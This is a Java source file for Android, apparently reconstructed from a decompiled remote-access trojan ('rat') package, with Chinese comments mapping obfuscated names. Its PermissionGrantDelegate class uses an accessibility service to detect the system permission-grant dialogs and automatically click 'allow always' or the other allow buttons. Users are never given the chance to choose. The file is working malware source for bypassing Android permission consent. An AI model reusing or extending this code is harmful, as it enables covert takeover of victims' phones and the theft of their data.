package com.vendor.rat.auto.engine;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * 权限授予自动点击代理
 *
 * Vendor: o/l.java (71 行)
 * 功能: 监听系统权限申请对话框，自动点击"始终允许"/"允许"按钮
 *       支持两种权限控制器 Activity:
 *         - com.android.packageinstaller.permission.ui.GrantPermissionsActivity
 *         - com.android.permissioncontroller.permission.ui.GrantPermissionsActivity
 *
 * 字段对齐:
 *   f670o → SYNTHETIC_FLAG (static synthetic int, 值为 0)
 *   f671n → processedActions (ConcurrentLinkedQueue)
 *
 * 方法对齐:
 *   H()  → createPackageInstallerWindow()
 *   I()  → createPermissionControllerWindow()
 *   J()  → createListenWindows()
 *   d()  → destroy() (override)
 *   u()  → onAccessibilityEvent() (override)
 */
public class PermissionGrantDelegate extends AutoEngine {

    private static final String TAG = "PermGrantDelegate";

    private static final String PERMISSION_CONTROLLER = "com.android.permissioncontroller";

    // ADAPT: f670o → 静态合成字段
    public static final int SYNTHETIC_FLAG = 0;

    // ADAPT: f671n → processedActions
    public final ConcurrentLinkedQueue<String> processedActions;

    public PermissionGrantDelegate() {
        super(createListenWindows(), PERMISSION_CONTROLLER);
        this.processedActions = new ConcurrentLinkedQueue<>();
    }

    @Override
    public void execute() {
        // ADAPT: vendor 无独立 execute，由 onAccessibilityEvent 驱动
    }

    @Override
    public void onWindowMatched(String packageName, String className, AccessibilityEvent event) {
        Log.d(TAG, "已进入是否允许权限申请窗口");
        if (!processedActions.contains("allowInGrantPermission")) {
            processedActions.add("allowInGrantPermission");
            autoGrantPermission();
        }
    }

    /**
     * 创建 packageinstaller 权限窗口匹配器
     * ADAPT: H() → createPackageInstallerWindow
     */
    public static WindowMatcher createPackageInstallerWindow() {
        // ADAPT: vendor 传 null 作为 packageName
        return new WindowMatcher(PERMISSION_CONTROLLER,
                "com.android.packageinstaller.permission.ui.GrantPermissionsActivity")
                .addEventType(32).addEventType(16384);
    }

    /**
     * 创建 permissioncontroller 权限窗口匹配器
     * ADAPT: I() → createPermissionControllerWindow
     */
    public static WindowMatcher createPermissionControllerWindow() {
        return new WindowMatcher(PERMISSION_CONTROLLER,
                "com.android.permissioncontroller.permission.ui.GrantPermissionsActivity")
                .addEventType(32).addEventType(16384);
    }

    /**
     * 创建所有监听窗口列表
     * ADAPT: J() → createListenWindows
     */
    public static List<WindowMatcher> createListenWindows() {
        List<WindowMatcher> list = new ArrayList<>();
        list.add(createPackageInstallerWindow());
        list.add(createPermissionControllerWindow());
        return list;
    }

    /**
     * 自动点击权限允许按钮
     * ADAPT: case 2 in o/a.java
     *
     * 按优先级尝试点击:
     *   1. permission_allow_always_button (始终允许)
     *   2. permission_allow_button (允许)
     *   3. permission_allow_foreground_only_button (仅前台允许)
     *   4. permission_allow_one_time_button (仅此次允许)
     */
    public void autoGrantPermission() {
        UiNode root = getRootNode();
        if (root == null) return;

        String[] buttonSuffixes = {
            ":id/permission_allow_always_button",
            ":id/permission_allow_button",
            ":id/permission_allow_foreground_only_button",
            ":id/permission_allow_one_time_button"
        };

        for (String suffix : buttonSuffixes) {
            CombineFilter filter = CombineFilter.and(
                    StringCondition.className("android.widget.Button"),
                    new StringCondition(StringCondition.Property.VIEW_ID, suffix,
                            StringCondition.MatchType.ENDS_WITH));

            UiNode button = root.findOneByCombine(filter);
            if (button != null && button.click()) {
                Log.d(TAG, "已点击允许权限申请");
                break;
            }
        }

        processedActions.remove("allowInGrantPermission");
    }

    /**
     * 处理无障碍事件
     * ADAPT: u() → onAccessibilityEvent
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName, String className) {
        super.onAccessibilityEvent(event, packageName, className);

        if (matchWindow(packageName, className, event != null ? event.getEventType() : 0)) {
            Log.d(TAG, "已进入是否允许权限申请窗口");
            if (!processedActions.contains("allowInGrantPermission")) {
                processedActions.add("allowInGrantPermission");
                // ADAPT: com.guard.wallet.thread.l.c(new a(this, 2), this.c)
                autoGrantPermission();
            }
        }
    }
}
